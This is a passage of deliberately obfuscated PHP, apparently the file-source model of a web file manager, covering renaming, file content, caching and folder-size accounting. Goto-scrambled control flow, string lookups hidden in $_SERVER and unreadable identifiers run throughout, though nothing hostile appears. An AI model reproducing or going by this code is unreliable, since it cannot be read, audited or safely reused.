Fˆ‹Ú‚öÒ…; BáÉŒË‘: } public function childrenAll($D‹³¦Šâ¸Æ) { $DÎñ¨‰”Ø =& $_SERVER[›èö’ù¤]; $A£èŞ³„› = $D‹³¦Šâ¸Æ[$DÎñ¨‰”Ø[397]]; if ($D‹³¦Šâ¸Æ[$DÎñ¨‰”Ø[405]] == $DÎñ¨‰”Ø[87]) { $bÔîëåİ· = array($DÎñ¨‰”Ø[579] => array($DÎñ¨‰”Ø[539], $D‹³¦Šâ¸Æ[$DÎñ¨‰”Ø[516]] . $A£èŞ³„› . $DÎñ¨‰”Ø[540])); $c°»àÅÁó = array($DÎñ¨‰”Ø[579] => $bÔîëåİ·[$DÎñ¨‰”Ø[516]]); $CŒ¿¸®ø­× = $this->field($DÎñ¨‰”Ø[2005])->where($c°»àÅÁó)->select(); $DÁ¬æÇŠ“ = !1; $a¼²²íë§ö = array($A£èŞ³„›); if ($CŒ¿¸®ø­×) { $DÁ¬æÇŠ“ = array_to_keyvalue($CŒ¿¸®ø­×, $DÎñ¨‰”Ø[33], $DÎñ¨‰”Ø[462]); $DÁ¬æÇŠ“ = array_remove_value($DÁ¬æÇŠ“, $DÎñ¨‰”Ø[191]); $a¼²²íë§ö = array_to_keyvalue($CŒ¿¸®ø­×, $DÎñ¨‰”Ø[33], $DÎñ¨‰”Ø[397]); $a¼²²íë§ö[] = $A£èŞ³„›; } } else { $DÁ¬æÇŠ“ = array($D‹³¦Šâ¸Æ[$DÎñ¨‰”Ø[462]]); $a¼²²íë§ö = array($A£èŞ³„›); } return array($DÎñ¨‰”Ø[2002] => $a¼²²íë§ö, $DÎñ¨‰”Ø[1370] => $DÁ¬æÇŠ“); } public function removeArray($cù”ÙàâùŠ) { if (!$cù”ÙàâùŠ) { return !0; } } public function removeRelevance($Dàí´¡îë, $DÕÔŒ‚®ç) { goto aØñˆ°­œÊ; cÊÈ®ÙŠç‚: Model($D½ŒñŠÁ «[1984])->removeBySource($Dàí´¡îë); $this->where($cƒ¬ó·ãó³)->delete(); Model($D½ŒñŠÁ «[465])->remove($DÕÔŒ‚®ç); goto AÓÆ­‰×Â¾; EŒŠÚµ¥“ê: $Dàí´¡îë = array_unique(array_filter($Dàí´¡îë)); $DÕÔŒ‚®ç = array_unique(array_filter($DÕÔŒ‚®ç)); if (!$Dàí´¡îë) { return !1; } goto FáĞ×Ì§; AÓÆ­‰×Â¾: for ($f‰¼ÔğßÜ = 0; $f‰¼ÔğßÜ < count($Dàí´¡îë); $f‰¼ÔğßÜ++) { $this->sourceCacheClear($Dàí´¡îë[$f‰¼ÔğßÜ]); } goto B…¾‡»Êèé; FáĞ×Ì§: $cƒ¬ó·ãó³ = array($D½ŒñŠÁ «[412] => array($D½ŒñŠÁ «[413], $Dàí´¡îë)); Model($D½ŒñŠÁ «[2003])->where($cƒ¬ó·ãó³)->delete(); Model($D½ŒñŠÁ «[456])->where($cƒ¬ó·ãó³)->delete(); goto aÊå‡’µÚğ; aØñˆ°­œÊ: $D½ŒñŠÁ « =& $_SERVER[›èö’ù¤]; $Dàí´¡îë = $Dàí´¡îë ? $Dàí´¡îë : array(); $DÕÔŒ‚®ç = $DÕÔŒ‚®ç ? $DÕÔŒ‚®ç : array(); goto EŒŠÚµ¥“ê; aÊå‡’µÚğ: Model($D½ŒñŠÁ «[1860])->where($cƒ¬ó·ãó³)->delete(); Model($D½ŒñŠÁ «[559])->where($cƒ¬ó·ãó³)->delete(); Model($D½ŒñŠÁ «[1697])->removeBySource($Dàí´¡îë); goto cÊÈ®ÙŠç‚; B…¾‡»Êèé: } public function rename($E×Ã£íÃ¬Š, $a›Åé…­ä) { goto f¨¤•ÌÏ£é; A£ó¦ùˆ¹È: $this->setNamePinyin($E×Ã£íÃ¬Š, $aŞÖÇ…æÛÎ[$D¤øÄÍ½¾§[28]], !1); $this->updateModifyTime($aÁŞ†‹†Ò[$D¤øÄÍ½¾§[493]]); $c‹ÏÈî±ïÈ = $this->where(array($D¤øÄÍ½¾§[412] => $E×Ã£íÃ¬Š))->data($aŞÖÇ…æÛÎ)->save(); goto aµµõ‹³šÏ; aµµõ‹³šÏ: $Aõ®±Èß” = $D¤øÄÍ½¾§[1992] . $aÁŞ†‹†Ò[$D¤øÄÍ½¾§[493]]; if (isset(self::$cacheChildList[$Aõ®±Èß”])) { unset(self::$cacheChildList[$Aõ®±Èß”]); } return $c‹ÏÈî±ïÈ; goto EÈôÊÌÇÕ±; f¨¤•ÌÏ£é: $D¤øÄÍ½¾§ =& $_SERVER[›èö’ù¤]; $aÁŞ†‹†Ò = $this->sourceInfo($E×Ã£íÃ¬Š); if (!$aÁŞ†‹†Ò) { return !1; } goto fÖËƒÉô½; D…Ú ×Æøé: if ($aÁŞ†‹†Ò[$D¤øÄÍ½¾§[405]] != $D¤øÄÍ½¾§[87]) { $aŞÖÇ…æÛÎ[$D¤øÄÍ½¾§[407]] = substr(get_path_ext($a›Åé…­ä), 0, 10); } Model($D¤øÄÍ½¾§[559])->eventRename($E×Ã£íÃ¬Š, $aÁŞ†‹†Ò[$D¤øÄÍ½¾§[28]], $a›Åé…­ä); $this->sourceCacheClear($E×Ã£íÃ¬Š); goto A£ó¦ùˆ¹È; fÖËƒÉô½: $DÌ…ß¥Œ¡Ë = $this->fileNameExist($aÁŞ†‹†Ò[$D¤øÄÍ½¾§[493]], $a›Åé…­ä); if ($DÌ…ß¥Œ¡Ë && $DÌ…ß¥Œ¡Ë != $E×Ã£íÃ¬Š) { return !1; } $aŞÖÇ…æÛÎ = array($D¤øÄÍ½¾§[415] => $a›Åé…­ä, $D¤øÄÍ½¾§[578] => USER_ID); goto D…Ú ×Æøé; EÈôÊÌÇÕ±: } public function setNamePinyin($E²«ÁŞà˜°, $C«±•øö²Ğ, $FÏ‡Ñ‰†® = true) { $DË²Õ“ºŞ =& $_SERVER[›èö’ù¤]; $AíÎÑÙïÜ = Input::check($C«±•øö²Ğ, $DË²Õ“ºŞ[582]); $a«å»ñÈÈé = array($DË²Õ“ºŞ[437] => KodSort::makeStr($C«±•øö²Ğ)); if ($AíÎÑÙïÜ) { $a«å»ñÈÈé[$DË²Õ“ºŞ[459]] = str_replace($DË²Õ“ºŞ[50], $DË²Õ“ºŞ[33], Pinyin::get($C«±•øö²Ğ)); $a«å»ñÈÈé[$DË²Õ“ºŞ[458]] = Pinyin::get($C«±•øö²Ğ, $DË²Õ“ºŞ[583]); } if (!$FÏ‡Ñ‰†® && !$AíÎÑÙïÜ) { $a«å»ñÈÈé[$DË²Õ“ºŞ[459]] = null; $a«å»ñÈÈé[$DË²Õ“ºŞ[458]] = null; } $this->metaSet($E²«ÁŞà˜°, $a«å»ñÈÈé); } public function getContent($AíîÂ‘é÷ø) { goto f®ÉÙëŠÁİ; Eëë˜åÀ Ô: if (!$B„ÛÛ¶ ¼[$CµÙªØö„¦[76]]) { return $CµÙªØö„¦[33]; } return IO::getContent($B„ÛÛ¶ ¼[$CµÙªØö„¦[76]]); goto fâ²®ÓÌ“; d¶Öá¨òÂ: if ($B„ÛÛ¶ ¼[$CµÙªØö„¦[78]] == 0) { return $CµÙªØö„¦[33]; } $e•øÛâ‚öÛ = $CµÙªØö„¦[2006] . $B„ÛÛ¶ ¼[$CµÙªØö„¦[170]]; if ($B„ÛÛ¶ ¼[$CµÙªØö„¦[78]] <= 1024 * 10) { $Cğï®Ï¥­ = Cache::get($e•øÛâ‚öÛ); if (!$Cğï®Ï¥­) { $Cğï®Ï¥­ = IO::getContent($B„ÛÛ¶ ¼[$CµÙªØö„¦[76]]); Cache::set($e•øÛâ‚öÛ, $Cğï®Ï¥­); } return $Cğï®Ï¥­; } goto Eëë˜åÀ Ô; f®ÉÙëŠÁİ: $CµÙªØö„¦ =& $_SERVER[›èö’ù¤]; $B„ÛÛ¶ ¼ = $this->fileInfoGet($AíîÂ‘é÷ø); if (!$B„ÛÛ¶ ¼) { return !1; } goto d¶Öá¨òÂ; fâ²®ÓÌ“: } public function setDesc($B©¹ŸÆ„Û, $DÃíÜËĞ·à) { $A­‰³—à™« =& $_SERVER[›èö’ù¤]; Model($A­‰³—à™«[559])->eventAddDesc($B©¹ŸÆ„Û, $DÃíÜËĞ·à); return $this->metaSet($B©¹ŸÆ„Û, $A­‰³—à™«[446], $DÃíÜËĞ·à); } public function setContent($bßğÎ©Õì, $b‹ä—øíĞ = '') { goto DñÕ£ŒÂ¬ˆ; d³¥¤‹ï‰: if (!$Cã›Œ‡‘ï•) { return Model($CëÑÊƒõ˜[465])->remove($c²ô¯¤‰Ñ•[$CëÑÊƒõ˜[462]]); } $this->folderSizeReset($dñğÅßšò‘[$CëÑÊƒõ˜[493]]); return !0; goto E„‡ØÊŠÒÆ; DñÕ£ŒÂ¬ˆ: $CëÑÊƒõ˜ =& $_SERVER[›èö’ù¤]; $dñğÅßšò‘ = $this->sourceInfo($bßğÎ©Õì); $B“ŒÊ”ÏÚ³ = $this->fileInfoGet($bßğÎ©Õì); goto CÄÄÜë¡È; CÄÄÜë¡È: if (!$B“ŒÊ”ÏÚ³ || !$dñğÅßšò‘) { return !1; } $c²ô¯¤‰Ñ• = Model($CëÑÊƒõ˜[465])->addFileByContent($b‹ä—øíĞ, $dñğÅßšò‘[$CëÑÊƒõ˜[28]]); $Cã›Œ‡‘ï• = $this->fileHistory($dñğÅßšò‘, $c²ô¯¤‰Ñ•[$CëÑÊƒõ˜[462]], $c²ô¯¤‰Ñ•[$CëÑÊƒõ˜[78]]); goto d³¥¤‹ï‰; E„‡ØÊŠÒÆ: } public function fileSubstr($cÜ¹Î«ğ, $CÀ©©Ü¾öØ, $F»¥ï­º) { $A¶–èÒ‘‚Î = $this->fileInfoGet($cÜ¹Î«ğ); if (!$A¶–èÒ‘‚Î) { return !1; } return IO::fileSubstr($A¶–èÒ‘‚Î[$_SERVER[›èö’ù¤][76]], $CÀ©©Ü¾öØ, $F»¥ï­º); } public function fileInfoGet($AÕ¶‘ÈÛ) { goto E…­åê¼Ø; C®È÷ô•: $EøÈ¤„„Ú = Model($Cßî ÓùÎŠ[465])->fileInfo($cµçä«­‚[$Cßî ÓùÎŠ[462]]); if ($EøÈ¤„„Ú) { $EøÈ¤„„Ú[$Cßî ÓùÎŠ[28]] = $cµçä«­‚[$Cßî ÓùÎŠ[28]]; } self::$cacheFileInfo[$DŠ ÆÛ¦ºò] = $EøÈ¤„„Ú; goto F”¹Âöè£ù; E…­åê¼Ø: $Cßî ÓùÎŠ =& $_SERVER[›èö’ù¤]; $cµçä«­‚ = $this->sourceInfo($AÕ¶‘ÈÛ); if (!$cµçä«­‚ || $cµçä«­‚[$Cßî ÓùÎŠ[405]]) { return !1; } goto DŒ‡å«Œèß; F”¹Âöè£ù: return $EøÈ¤„„Ú; goto föÇéãŒ‡¦; DŒ‡å«Œèß: $DŠ ÆÛ¦ºò = $Cßî ÓùÎŠ[468] . $cµçä«­‚[$Cßî ÓùÎŠ[462]]; $CÇÙ£Ó‡¿ = _get(self::$cacheFileInfo, $DŠ ÆÛ¦ºò); if ($CÇÙ£Ó‡¿) { return $CÇÙ£Ó‡¿; } goto C®È÷ô•; föÇéãŒ‡¦: } private function folderChildrenNumber($aóÀ’‡Äë) { $dÌ÷É¢¹‘é =& $_SERVER[›èö’ù¤]; $aÜ¨ø‰ãîÓ = $this->sourceInfo($aóÀ’‡Äë); $ağâØ™éÇˆ = array($dÌ÷É¢¹‘é[579] => array($dÌ÷É¢¹‘é[539], $aÜ¨ø‰ãîÓ[$dÌ÷É¢¹‘é[516]] . $aóÀ’‡Äë . $dÌ÷É¢¹‘é[540]), $dÌ÷É¢¹‘é[424] => intval($aÜ¨ø‰ãîÓ[$dÌ÷É¢¹‘é[425]]), $dÌ÷É¢¹‘é[572] => 1); $CøÛêĞœ¾‹ = $this->where($ağâØ™éÇˆ)->count(); $Fƒ³‡ã©Ï = $this->where($ağâØ™éÇˆ)->where(array($dÌ÷É¢¹‘é[572] => 0))->count(); return array($dÌ÷É¢¹‘é[82] => $Fƒ³‡ã©Ï, $dÌ÷É¢¹‘é[83] => $CøÛêĞœ¾‹); } public function pathInfo($FÖŒ¯Í‡Êç, $f¨ØÎëñŞÛ = false) { goto D½‘ææˆá•; B«è…ô šÁ: self::$cachePathInfo[$Aî–³È©£¶] = $DŠ¶›ø¨±±; return $DŠ¶›ø¨±±; goto A³‘È‹á×»; CŞ¢º°ï¡Ó: $Aî–³È©£¶ = $F’´Ğ±”Å[454] . intval($f¨ØÎëñŞÛ) . $F’´Ğ±”Å[455] . $FÖŒ¯Í‡Êç; $cïñ—²±È = _get(self::$cachePathInfo, $Aî–³È©£¶); if ($cïñ—²±È) { return $cïñ—²±È; } goto aí¨ÂÏ‹×â; aí¨ÂÏ‹×â: $DŠ¶›ø¨±± = $this->sourceInfo($FÖŒ¯Í‡Êç); if (!$DŠ¶›ø¨±±) { return !1; } $DŠ¶›ø¨±± = $this->_listDataApplyItem($DŠ¶›ø¨±±, $f¨ØÎëñŞÛ); goto B«è…ô šÁ; D½‘ææˆá•: $F’´Ğ±”Å =& $_SERVER[›èö’ù¤]; $f¨ØÎëñŞÛ = !1; $FÖŒ¯Í‡Êç = intval($FÖŒ¯Í‡Êç); goto CŞ¢º°ï¡Ó; A³‘È‹á×»: } public static $cachePathInfoMore = array(); public function pathInfoMore($aßÇÂŒö) { goto F©„‰×‡; F©„‰×‡: $B„”Œƒƒ—“ =& $_SERVER[›èö’ù¤]; $B–Œ¦Š¡‘í = _get(self::$cachePathInfoMore, $aßÇÂŒö); if ($B–Œ¦Š¡‘í) { return $B–Œ¦Š¡‘í; } goto eÚÇ©ê‰Åå; eÚÇ©ê‰Åå: $d³Œ‚Œª¦ = $this->pathInfo($aßÇÂŒö); if (!$d³Œ‚Œª¦) { return !1; } if ($d³Œ‚Œª¦[$B„”Œƒƒ—“[405]] == $B„”Œƒƒ—“[87]) { $d³Œ‚Œª¦[$B„”Œƒƒ—“[81]] = $this->folderChildrenNumber($aßÇÂŒö); } goto céÕôôôÔ•; céÕôôôÔ•: self::$cachePathInfoMore[$aßÇÂŒö] = $d³Œ‚Œª¦; return $d³Œ‚Œª¦; goto A‘Ô­·¨ï½; A‘Ô­·¨ï½: } public function sourceInfo($AºÕÙÎƒ·Ÿ) { goto dÓ°»ƒèæ¶; dÓ°»ƒèæ¶: $bÒ—¬ùöƒ¥ =& $_SERVER[›èö’ù¤]; if (!$AºÕÙÎƒ·Ÿ) { return array(); } $AºÕÙÎƒ·Ÿ = intval($AºÕÙÎƒ·Ÿ); goto DÖøôºĞ›; DÖøôºĞ›: $EÊÔŠ®Â£Ã = $bÒ—¬ùöƒ¥[453] . $AºÕÙÎƒ·Ÿ; $e÷ÜäÆåØ‘ = _get(self::$cacheSourceInfo, $EÊÔŠ®Â£Ã); if ($e÷ÜäÆåØ‘) { return $e÷ÜäÆåØ‘; } goto A„¹ò‡˜®¯; A„¹ò‡˜®¯: $bíù­çÚ« = $this->where(array($bÒ—¬ùöƒ¥[397] => $AºÕÙÎƒ·Ÿ))->find(); self::$cacheSourceInfo[$EÊÔŠ®Â£Ã] = $bíù­çÚ«; return self::$cacheSourceInfo[$EÊÔŠ®Â£Ã]; goto cÕÅ¨ñö ë; cÕÅ¨ñö ë: } public function sourceCacheClear($d©î©Ø¡İ = false) { self::cacheClear($d©î©Ø¡İ); } public static function cacheClear($BëßÙù¹Ç = false) { $eÙÂòÑîÔİ =& $_SERVER[›èö’ù¤]; if ($BëßÙù¹Ç == !1) { goto DğƒÈÊ‘¡‹; c´ÑèÅ´æä: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto D†ªÈ¾â¿¶; D†ªÈ¾â¿¶: return; goto Dª–­ó¯‘…; DğƒÈÊ‘¡‹: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto c´ÑèÅ´æä; Dª–­ó¯‘…: } unset(self::$cacheSourceInfo[$eÙÂòÑîÔİ[453] . $BëßÙù¹Ç]); unset(self::$cachePathInfoMore[$BëßÙù¹Ç]); unset(self::$cachePathInfo[$eÙÂòÑîÔİ[2007] . $BëßÙù¹Ç]); unset(self::$cachePathInfo[$eÙÂòÑîÔİ[2008] . $BëßÙù¹Ç]); } public function metaSet($C°Ğ®ñ¯…, $F›µ³´¾ìº = null, $bì¡„…Ş‚ = null) { $D«é·ôæÌù = parent::metaSet($C°Ğ®ñ¯…, $F›µ³´¾ìº, $bì¡„…Ş‚); if ($D«é·ôæÌù) { $this->sourceCacheClear($C°Ğ®ñ¯…); } return $D«é·ôæÌù; } public function pathInfoByPath($eÛ¼åµæëš, $f†Âøœ¼ßá) { $F°ÒÌ¢ßÜæ =& $_SERVER[›èö’ù¤]; $d£÷ÕôìÕç = !$f†Âøœ¼ßá ? array() : explode($F°ÒÌ¢ßÜæ[8], trim($f†Âøœ¼ßá, $F°ÒÌ¢ßÜæ[8])); $e„Âñ¯ßâŞ = $eÛ¼åµæëš; foreach ($d£÷ÕôìÕç as $EáŒ‹Şçù™) { $A¬¦…¿š‹µ = array($F°ÒÌ¢ßÜæ[493] => $e„Âñ¯ßâŞ, $F°ÒÌ¢ßÜæ[28] => $EáŒ‹Şçù™); $F°‘®Ä¢İË = $this->where($A¬¦…¿š‹µ)->select(); if (!$F°‘®Ä¢İË) { return !1; } $F°‘®Ä¢İË = array_sort_by($F°‘®Ä¢İË, $F°ÒÌ¢ßÜæ[425]); $e„Âñ¯ßâŞ = $F°‘®Ä¢İË[0][$F°ÒÌ¢ßÜæ[397]]; } return $this->pathInfo($e„Âñ¯ßâŞ, !0); } protected function updateModifyTime($e­ó¨““…Î) { goto D»Æáºß¢µ; bËÊ­Ş–¯: if (!is_array($e­ó¨““…Î)) { $e­ó¨““…Î = array($e­ó¨““…Î); } foreach ($e­ó¨““…Î as $eÊ‡ºö±¨Ì => $F‡¿Ó«•—) { $e­ó¨““…Î[$eÊ‡ºö±¨Ì] = intval($F‡¿Ó«•—); $this->sourceCacheClear($F‡¿Ó«•—); } $Bˆ°¥µ½Ï = array($BÜŞÁñ[397] => array($BÜŞÁñ[7], $e­ó¨““…Î)); goto eí¨ĞÓ¿Ó ; eí¨ĞÓ¿Ó : $a‹‘ëÌºâ = array($BÜŞÁñ[578] => $a…âˆÚ‡Î, $BÜŞÁñ[419] => time()); $this->where($Bˆ°¥µ½Ï)->save($a‹‘ëÌºâ); goto B†ğãÁÕ›”; D»Æáºß¢µ: $BÜŞÁñ =& $_SERVER[›èö’ù¤]; $a…âˆÚ‡Î = defined($BÜŞÁñ[469]) ? USER_ID : $BÜŞÁñ[191]; if (!$e­ó¨““…Î) { return; } goto bËÊ­Ş–¯; B†ğãÁÕ›”: } public function folderSizeReset($c£Ì…¯Ğ, $a¤ñàŒÜƒâ = false) { goto cõŒõÚ’ÍÔ; cõŒõÚ’ÍÔ: $f‰•íõÆ”ƒ =& $_SERVER[›èö’ù¤]; if ($this->statusIgnoreResetSpace) { return; } $fÇµâ¡Î®ø = $this->sourceInfo($c£Ì…¯Ğ); goto D¨±¸œ‚§; e£Èë‘å²ˆ: if ($a¤ñàŒÜƒâ == 0) { return CacheLock::unlock($Cº£óæâêù); } $c¹Üóñ = $this->parentLevelArray($fÇµâ¡Î®ø[$f‰•íõÆ”ƒ[516]]); if (!$c¹Üóñ) { $c¹Üóñ = array(); } goto a®áõ´À§Ç; a—¼˜â§ñõ: $this->where($cÕ¤¦…áÍ)->setAdd($f‰•íõÆ”ƒ[78], $a¤ñàŒÜƒâ); CacheLock::unlock($Cº£óæâêù); $C¯çõØÀá = $f‰•íõÆ”ƒ[2010] . $fÇµâ¡Î®ø[$f‰•íõÆ”ƒ[406]] . $f‰•íõÆ”ƒ[4] . $fÇµâ¡Î®ø[$f‰•íõÆ”ƒ[499]]; goto fœ°…àÎáÚ; fœ°…àÎáÚ: $B«ª–ÑÔİ = array($fÇµâ¡Î®ø[$f‰•íõÆ”ƒ[406]], $fÇµâ¡Î®ø[$f‰•íõÆ”ƒ[499]]); TaskRun::timeLimitCall($C¯çõØÀá, $f‰•íõÆ”ƒ[2011], $B«ª–ÑÔİ, 1.5); goto bé˜ù‹œè; D¨±¸œ‚§: $Cº£óæâêù = $f‰•íõÆ”ƒ[2009] . $c£Ì…¯Ğ; CacheLock::lock($Cº£óæâêù, 20); if ($a¤ñàŒÜƒâ === !1) { $this->sourceCacheClear($c£Ì…¯Ğ); $fÇµâ¡Î®ø = $this->sourceInfo($c£Ì…¯Ğ); $cÕ¤¦…áÍ = array($f‰•íõÆ”ƒ[396] => $c£Ì…¯Ğ, $f‰•íõÆ”ƒ[424] => 0); $dÃŞ´”“²Ó = $this->where($cÕ¤¦…áÍ)->sum($f‰•íõÆ”ƒ[78]); $a¤ñàŒÜƒâ = intval($dÃŞ´”“²Ó) - intval($fÇµâ¡Î®ø[$f‰•íõÆ”ƒ[78]]); } goto e£Èë‘å²ˆ; a®áõ´À§Ç: $c¹Üóñ[] = $fÇµâ¡Î®ø[$f‰•íõÆ”ƒ[397]]; $cÕ¤¦…áÍ = array($f‰•íõÆ”ƒ[397] => array($f‰•íõÆ”ƒ[413], $c¹Üóñ)); if ($a¤ñàŒÜƒâ < 0) { $cÕ¤¦…áÍ[$f‰•íõÆ”ƒ[78]] = array($f‰•íõÆ”ƒ[998], abs($a¤ñàŒÜƒâ)); } goto a—¼˜â§ñõ; bé˜ù‹œè: } public function folderSizeResetChildren($FŠŠËë…¶„) { goto eÙëß‚ÖÔ; DøôŞŒÊÈø: $C¶µîš´[$c¹ìÜÖÔƒ[405]] = 0; $E¡æºˆ„§¥ = $this->field($fÌö‰—©³±)->where($C¶µîš´)->select(); if (!$E¡æºˆ„§¥) { return; } goto d¬æ–ºÃë; Aô‚ÆïĞ¢‹: foreach ($E¡æºˆ„§¥ as $B°ùÜÈ‘š) { $D­ŒÅÌ® = $B°ùÜÈ‘š[$c¹ìÜÖÔƒ[493]] . $c¹ìÜÖÔƒ[33]; if (!isset($fõ³ ®öÍè[$D­ŒÅÌ®])) { continue; } if ($B°ùÜÈ‘š[$c¹ìÜÖÔƒ[425]] == $fõ³ ®öÍè[$D­ŒÅÌ®][$c¹ìÜÖÔƒ[425]]) { $fõ³ ®öÍè[$D­ŒÅÌ®][$c¹ìÜÖÔƒ[78]] += $B°ùÜÈ‘š[$c¹ìÜÖÔƒ[78]]; } } foreach ($fõ³ ®öÍè as $B°ùÜÈ‘š) { $eù‘–¾‰ë = $this->parentLevelArray($B°ùÜÈ‘š[$c¹ìÜÖÔƒ[516]]); foreach ($eù‘–¾‰ë as $D­ŒÅÌ®) { $D­ŒÅÌ® = $D­ŒÅÌ® . $c¹ìÜÖÔƒ[33]; if (!isset($fõ³ ®öÍè[$D­ŒÅÌ®])) { continue; } if ($B°ùÜÈ‘š[$c¹ìÜÖÔƒ[425]] == $fõ³ ®öÍè[$D­ŒÅÌ®][$c¹ìÜÖÔƒ[425]]) { $fõ³ ®öÍè[$D­ŒÅÌ®][$c¹ìÜÖÔƒ[78]] += $B°ùÜÈ‘š[$c¹ìÜÖÔƒ[78]]; } } } $a¼ÚŒ’²éØ = array(); goto AÛÄŠ‘”æÁ; d¬æ–ºÃë: $fõ³ ®öÍè[] = $B“ëŞ‘£·Ñ; $fõ³ ®öÍè = array_to_keyvalue($fõ³ ®öÍè, $c¹ìÜÖÔƒ[397]); foreach ($fõ³ ®öÍè as $B‰õÅ´Îøñ => $B°ùÜÈ‘š) { $fõ³ ®öÍè[$B‰õÅ´Îøñ][$c¹ìÜÖÔƒ[2013]] = $fõ³ ®öÍè[$B‰õÅ´Îøñ][$c¹ìÜÖÔƒ[78]]; $fõ³ ®öÍè[$B‰õÅ´Îøñ][$c¹ìÜÖÔƒ[78]] = 0; } goto Aô‚ÆïĞ¢‹; AÛÄŠ‘”æÁ: foreach ($fõ³ ®öÍè as $B°ùÜÈ‘š) { if ($B°ùÜÈ‘š[$c¹ìÜÖÔƒ[78]] == $B°ùÜÈ‘š[$c¹ìÜÖÔƒ[2013]]) { continue; } $a¼ÚŒ’²éØ[] = array($c¹ìÜÖÔƒ[397], $B°ùÜÈ‘š[$c¹ìÜÖÔƒ[397]], $c¹ìÜÖÔƒ[78], $B°ùÜÈ‘š[$c¹ìÜÖÔƒ[78]]); } $this->saveAll($a¼ÚŒ’²éØ); goto eÅ¤Öç©–ƒ; eÙëß‚ÖÔ: $c¹ìÜÖÔƒ =& $_SERVER[›èö’ù¤]; $this->sourceCacheClear($FŠŠËë…¶„); $B“ëŞ‘£·Ñ = $this->sourceInfo($FŠŠËë…¶„); goto A¿ÈŞÆ‹Å÷; A¿ÈŞÆ‹Å÷: $C¶µîš´ = array($c¹ìÜÖÔƒ[572] => 1, $c¹ìÜÖÔƒ[579] => array($c¹ìÜÖÔƒ[539], $B“ëŞ‘£·Ñ[$c¹ìÜÖÔƒ[516]] . $FŠŠËë…¶„ . $c¹ìÜÖÔƒ[540])); $fÌö‰—©³± = $c¹ìÜÖÔƒ[2012]; $fõ³ ®öÍè = $this->field($fÌö‰—©³±)->where($C¶µîš´)->select(); goto DøôŞŒÊÈø; eÅ¤Öç©–ƒ: } public function userSpaceReset($d°ïÈË×ëŒ = false) { $B¾ï ğÜò— =& $_SERVER[›èö’ù¤]; $cØ¼³¥«Ó = $this->where(array($B¾ï ğÜò—[406] => self::TYPE_USER, $B¾ï ğÜò—[499] => $d°ïÈË×ëŒ, $B¾ï ğÜò—[405] => 0))->sum($B¾ï ğÜò—[78]); $cØ¼³¥«Ó = !$cØ¼³¥«Ó || $cØ¼³¥«Ó <= 0 ? 0 : $cØ¼³¥«Ó; Model($B¾ï ğÜò—[508])->userEdit($d°ïÈË×ëŒ, array($B¾ï ğÜò—[1706] => $cØ¼³¥«Ó)); } public function targetSpaceUpdate($f¶½‘ã‘ô¯, $EºìµÈ‚Åí) { $FƒË‡£’ß =& $_SERVER[›èö’ù¤]; if (!$EºìµÈ‚Åí) { return; } if (!in_array($f¶½‘ã‘ô¯, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $e“èÖ†…Ë„ = $this->targetSpaceSize($f¶½‘ã‘ô¯, $EºìµÈ‚Åí); if ($f¶½‘ã‘ô¯ == self::TYPE_USER) { Model($FƒË‡£’ß[508])->userEdit($EºìµÈ‚Åí, array($FƒË‡£’ß[1706] => $e“èÖ†…Ë„)); } else { if ($f¶½‘ã‘ô¯ == self::TYPE_GROUP) { Model($FƒË‡£’ß[517])->groupEdit($EºìµÈ‚Åí, array($FƒË‡£’ß[1706] => $e“èÖ†…Ë„)); } } } public function targetSpaceSize($A­ÜšĞ´‰±, $e÷Ô‘ŸÊÍˆ) { goto f¨èä¸¸†; fÙÙğ÷·ò¹: $a˜ÁöÖÁ×É = array_to_keyvalue($a˜ÁöÖÁ×É, $E‚ŞŠÕÔä‹[33], $E‚ŞŠÕÔä‹[397]); $a˜ÁöÖÁ×É = array_unique(array_filter($a˜ÁöÖÁ×É)); if ($a˜ÁöÖÁ×É) { $Bİˆõƒ¿†í = array($E‚ŞŠÕÔä‹[412] => array($E‚ŞŠÕÔä‹[413], $a˜ÁöÖÁ×É)); $B®¨Ø¡³ Ë += floatval($this->where($Bİˆõƒ¿†í)->sum($E‚ŞŠÕÔä‹[78])); } goto dˆö·ùê›Û; f¨èä¸¸†: $E‚ŞŠÕÔä‹ =& $_SERVER[›èö’ù¤]; $bèÕ”’Îì = $this->sourceRoot($A­ÜšĞ´‰±, $e÷Ô‘ŸÊÍˆ, !0); if (!$bèÕ”’Îì) { return 0; } goto b¶ôé˜¼³´; b¶ôé˜¼³´: $B®¨Ø¡³ Ë = floatval($bèÕ”’Îì[$E‚ŞŠÕÔä‹[78]]); $Bİˆõƒ¿†í = array($E‚ŞŠÕÔä‹[579] => array($E‚ŞŠÕÔä‹[539], $E‚ŞŠÕÔä‹[526] . $bèÕ”’Îì[$E‚ŞŠÕÔä‹[397]] . $E‚ŞŠÕÔä‹[540])); $a˜ÁöÖÁ×É = Model($E‚ŞŠÕÔä‹[423])->field($E‚ŞŠÕÔä‹[412])->where($Bİˆõƒ¿†í)->select(); goto fÙÙğ÷·ò¹; dˆö·ùê›Û: $B®¨Ø¡³ Ë = !$B®¨Ø¡³ Ë || $B®¨Ø¡³ Ë <= 0 ? 0 : $B®¨Ø¡³ Ë; return $B®¨Ø¡³ Ë; goto BÓœ¦‚ÙŒË; BÓœ¦‚ÙŒË: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($Dî’¯å¿¢Ş) { return $this->fileTypeProfile($Dî’¯å¿¢Ş, SourceModel::TYPE_USER); } public function groupFileTypeProfile($e¾í„è‘…£) { return $this->fileTypeProfile($e¾í„è‘…£, SourceModel::TYPE_GROUP); } private function fileTypeProfile($c¸•ƒÌî¸, $CÒ¤×Ğñíğ) { goto FÄøï«ôÛ; C”™ƒ—‹…: if ($EÔˆ»Ïµğ) { return $EÔˆ»Ïµğ; } $díÚ®Ù§ÒŒ = array($A²ÈÏÖÔß˜[572] => 0); if ($c¸•ƒÌî¸ != !1) { $díÚ®Ù§ÒŒ[$A²ÈÏÖÔß˜[499]] = $c¸•ƒÌî¸; $díÚ®Ù§ÒŒ[$A²ÈÏÖÔß˜[406]] = $CÒ¤×Ğñíğ; } goto FêàßŠ¬¨â; aÔŠ”×Õ‡: foreach ($b¡Ê¿™Á¶ as $d»Ğ¿ÀÛå” => $aØğƒä”‘¡) { $díÚ®Ù§ÒŒ[$A²ÈÏÖÔß˜[407]] = $this->fileTypeWhere($d»Ğ¿ÀÛå”); $FŠêƒâõ˜‘[$d»Ğ¿ÀÛå”] = array($A²ÈÏÖÔß˜[2016] => 